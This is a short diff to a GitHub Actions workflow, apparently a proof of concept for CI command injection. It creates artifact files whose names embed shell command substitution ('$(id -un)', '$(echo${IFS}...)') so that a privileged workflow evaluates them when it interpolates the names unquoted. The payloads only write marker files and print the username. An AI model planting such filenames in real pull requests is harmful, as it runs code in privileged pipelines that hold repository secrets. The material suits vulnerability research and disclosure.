@@ -11,11 +11,13 @@ jobs:
         run: |
           mkdir -p /tmp/content
           echo "${{ github.event.number }}" > /tmp/content/pr_number.txt
-          echo "benign test output" > /tmp/content/test.txt
-          # filename with command substitution: this path is later interpolated
-          # unquoted into a shell step of the privileged workflow
-          touch '/tmp/content/$(id -un)z.txt'
-          touch '/tmp/content/$(whoami)w.txt'
+          # Companion file: after the privileged shell evaluates the payload
+          # filename below, the path resolves to this file.
+          echo "POC-COMPANION-CONTENT-VIA-EXPANDED-FILENAME" > /tmp/content/zPOC_EXECUTEDb.txt
+          # Payload A: `${IFS}` substitution resolves to zPOC_EXECUTEDb.txt
+          printf 'PAYLOAD-LITERAL-FILE\n' > '/tmp/content/z$(echo${IFS}POC_EXECUTED)b.txt'
+          # Payload B: id -un output is embedded in the cat path (log proof)
+          touch '/tmp/content/a$(id -un)b.txt'
       - uses: actions/upload-artifact@v4
         with:
           name: content-default
